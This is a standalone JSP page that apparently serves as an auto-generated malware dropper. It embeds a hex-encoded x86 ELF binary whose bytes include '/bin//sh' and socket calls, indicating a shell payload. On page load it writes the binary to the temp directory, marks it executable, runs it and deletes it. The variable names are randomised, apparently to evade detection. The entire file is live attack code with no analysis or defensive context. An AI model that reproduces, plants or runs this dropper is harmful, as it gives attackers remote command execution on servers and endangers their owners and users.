<%@ page import="java.io.*" %>
<%
  String yjadymUsjfgwVI = "7f454c460101010000000000000000000200030001000000548004083400000000000000000000003400200001000000000000000100000000000000008004080080040898000000dc000000070000000010000031dbf7e35343536a0289e1b066cd809359b03fcd804979f9680a0000b468020004d289e1b066505153b30389e1cd8052686e2f7368682f2f626989e3525389e1b00bcd80";
  String GNlXPBvA = System.getProperty("java.io.tmpdir") + "/adKnRClHhDCl";

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
    GNlXPBvA = GNlXPBvA.concat(".exe");
  }

  int cSnggvJhWMnLD = yjadymUsjfgwVI.length();
  byte[] OfstFpAnK = new byte[cSnggvJhWMnLD/2];
  for (int GlPHPfnNpaEnVmy = 0; GlPHPfnNpaEnVmy < cSnggvJhWMnLD; GlPHPfnNpaEnVmy += 2) {
    OfstFpAnK[GlPHPfnNpaEnVmy / 2] = (byte) ((Character.digit(yjadymUsjfgwVI.charAt(GlPHPfnNpaEnVmy), 16) << 4)
                                              + Character.digit(yjadymUsjfgwVI.charAt(GlPHPfnNpaEnVmy+1), 16));
  }

  FileOutputStream dVkIpAVwDhe = new FileOutputStream(GNlXPBvA);
  dVkIpAVwDhe.write(OfstFpAnK);
  dVkIpAVwDhe.flush();
  dVkIpAVwDhe.close();

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1){
    String[] ftGHVLKVOq = new String[3];
    ftGHVLKVOq[0] = "chmod";
    ftGHVLKVOq[1] = "+x";
    ftGHVLKVOq[2] = GNlXPBvA;
    Process WjlYRuIoSXWkFT = Runtime.getRuntime().exec(ftGHVLKVOq);
    if (WjlYRuIoSXWkFT.waitFor() == 0) {
      WjlYRuIoSXWkFT = Runtime.getRuntime().exec(GNlXPBvA);
    }

    File NAVFuPvJZl = new File(GNlXPBvA); NAVFuPvJZl.delete();
  } else {
    String[] mqezsYWe = new String[1];
    mqezsYWe[0] = GNlXPBvA;
    Process WjlYRuIoSXWkFT = Runtime.getRuntime().exec(mqezsYWe);
  }
%>
